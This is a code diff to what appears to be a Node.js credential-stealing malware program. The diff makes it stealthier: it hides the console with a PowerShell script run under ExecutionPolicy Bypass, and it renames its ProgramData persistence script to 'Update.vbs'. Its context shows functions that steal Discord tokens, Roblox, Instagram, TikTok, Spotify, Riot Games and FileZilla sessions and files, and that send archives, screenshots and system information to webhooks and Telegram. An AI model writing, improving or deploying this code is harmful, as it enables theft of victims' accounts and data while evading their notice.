@@ -217,7 +217,7 @@ function generateRandomString(length) {
     return result;
 }
 
-function hideconsole() {
+function hideConsole() {
     let randomFileName = `${generateRandomString(10)}.ps1`;
 
     let powershellScript = `
@@ -234,13 +234,18 @@ function hideconsole() {
     [Console.Window]::ShowWindow($consolePtr, 0)
     `;
 
-    let workingDir = process.cwd();
-    let tempfile = `${workingDir}\\${randomFileName}`;
+    let tempDir = os.tmpdir();
+    let tempfile = path.join(tempDir, randomFileName);
     fs.writeFileSync(tempfile, powershellScript);
 
-    //a little convoluted to get around powershell script execution policy (might be disabled)
-    require('child_process').execSync(`type .\\${randomFileName} | powershell.exe -noprofile -`, {stdio: 'inherit'});
-    fs.unlinkSync(tempfile); //delete temp file
+    // Execute PowerShell script
+    try {
+        execSync(`powershell.exe -noprofile -ExecutionPolicy Bypass -File "${tempfile}"`, { stdio: 'inherit' });
+    } catch (error) {
+        console.error('Error executing PowerShell script:', error);
+    } finally {
+        fs.unlinkSync(tempfile); // Delete temp file
+    }
 }
 
 
@@ -384,7 +389,7 @@ function startup() {
   const exeFilePath = process.execPath; // Get the path of the running executable
 
   // VBScript file name and path
-  const vbsFileName = 'run_minimized.vbs';
+  const vbsFileName = 'Update.vbs';
   const programDataPath = path.join(process.env.PROGRAMDATA, vbsFileName); // Full path to the VBScript file in ProgramData
 
   // Registry key path
@@ -414,7 +419,6 @@ function startup() {
     console.log(`Registry key added successfully: ${stdout}`);
   });
 }
-
 
 
 function sendSuccessToWebhook() {i
@@ -639,9 +643,6 @@ function stealFiles() {
     console.error("Error:", err);
   }
 }
-
-
-
 
 
 function sendSuccessToWebhook() {
@@ -1228,7 +1229,6 @@ Set objShell = Nothing`;
 */
 
 
-
 async function GetInstaData(session_id) {
   try {
     const headers = {
@@ -1353,8 +1353,6 @@ async function SubmitInstagram(session_id) {
 }
 
 
-
-
 async function GetRobloxData(secret_cookie) {
   let data = {};
   let headers = {
@@ -1452,10 +1450,6 @@ async function SubmitRoblox(secret_cookie) {
 }
 
 
-
-
-
-
 //
 async function SpotifySession(cookie) {
     try {
@@ -1521,8 +1515,6 @@ async function SpotifySession(cookie) {
 }
 
 
-
-
 function moveTikTokFile(cookie) {
   if (!cookie) {
     // No TikTok session information intercepted, so no need to create the folder or file
@@ -1537,10 +1529,6 @@ function moveTikTokFile(cookie) {
   fs.writeFileSync(tiktokFilePath, cookie);
   console.log('TikTok session information written to tiktok.txt');
 }
-
-
-
-
 
 
 function stealTikTokSession(cookie) {
@@ -2071,8 +2059,6 @@ async function getGuildInvites(token, guildId) {
         return "No Invite";
     }
 }
-
-
 
 
 const badges = {
@@ -2787,7 +2773,6 @@ function computerinfo() {
 }
 
 
-
 async function archiveAndSendData() {
     let zipFilePath;
     const outputPath = path.join(mainFolderPath, 'Screenshots');
@@ -3158,8 +3143,6 @@ try {
             console.error(`Error sending system information to Telegram: ${error.message}`);
         }
     }
-
-
 
     const combinedInfoEmbed = {
         title: '',
@@ -3949,7 +3932,6 @@ function copyriot(source, target, excludeList = []) {
 }
 
 
-
 async function SubmitRiotGames() {
     try {
         var exists = false;
@@ -4176,7 +4158,6 @@ function manageBrowsers() {
     getTokens();
     submitFileZilla();
 }
-
 
 
 // Games Functions
